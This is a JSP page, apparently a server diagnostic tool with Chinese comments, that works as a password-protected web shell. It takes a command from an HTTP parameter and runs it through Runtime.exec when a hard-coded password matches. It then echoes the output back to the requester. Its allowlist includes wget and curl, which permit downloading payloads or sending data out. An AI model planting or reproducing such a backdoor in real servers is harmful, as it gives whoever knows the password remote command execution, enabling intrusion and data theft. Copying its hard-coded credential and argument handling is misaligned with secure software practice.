<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8" import="java.io.BufferedReader"%>
<%@ page import="java.io.InputStreamReader"%>
<%@ page import="java.util.ArrayList"%>
<%@ page import="java.util.HashSet"%>
<%@ page import="java.util.List"%>
<%@ page import="java.util.Set" %>
<%
	String password = request.getParameter("password");
	if (password == null || !password.equals("paycard1qaz2wsx")) {
		return;
	}

	//param init 参数初始化
	//命令
	String command = request.getParameter("command");

	//允许执行命令初始化
	Set<String> allowCommandSet = new HashSet<String>();
	allowCommandSet.add("grep");
	allowCommandSet.add("top");
	allowCommandSet.add("free");
	allowCommandSet.add("vmstat");
	allowCommandSet.add("tail");
	allowCommandSet.add("wget");
	allowCommandSet.add("curl");
	allowCommandSet.add("ls");


	Runtime run = Runtime.getRuntime();

	if (command != null && !command.equals("")) {
		out.write("**************[command]:" + command
				+ " ********************");
		String[] commands = command.trim().split(" ");
		List<String> commandList = new ArrayList<String>();
		if (commands != null && commands.length > 0) {
			String code = commands[0];
			if (!allowCommandSet.contains(code)) {
				out.write("**************forbidden**************");
				return;
			}
			for (int i = 0; i < commands.length; i++) {
				if (commands[i] != null) {
					commands[i]=commands[i].replace("!", " ");
					if(commands[i].trim().length()>1){
						commandList.add(commands[i].trim());
					}
				}
				out.write(" "+i+" "+commands[i]);
			}
		}

		Process p4 = null;
		try {
			p4 = run.exec(commands);
			if (p4.waitFor() == 0) { //0 表示命令执行成功;1 表示命令语法错误;2 表示命令执行错误  
				out.write("*** BEGIN command ***");
				BufferedReader reader = new BufferedReader(
						new InputStreamReader(p4.getInputStream()));
				String line = "";
				while ((line = reader.readLine()) != null) {
					out.write(line+"\n");
				}
			} else {
				if (p4.getErrorStream() != null) {
					out.write("ERROR:状态" + p4.waitFor());
					BufferedReader reader = new BufferedReader(
							new InputStreamReader(p4.getErrorStream()));
					String line = "";
					while ((line = reader.readLine()) != null) {
						out.write(line+"\n");
					}
				}
			}
		} finally {
			if (p4 != null) {
				if (p4.getInputStream() != null) {
					p4.getInputStream().close();
				}
				if (p4.getErrorStream() != null) {
					p4.getErrorStream().close();
				}
			}
		}
	}
%>
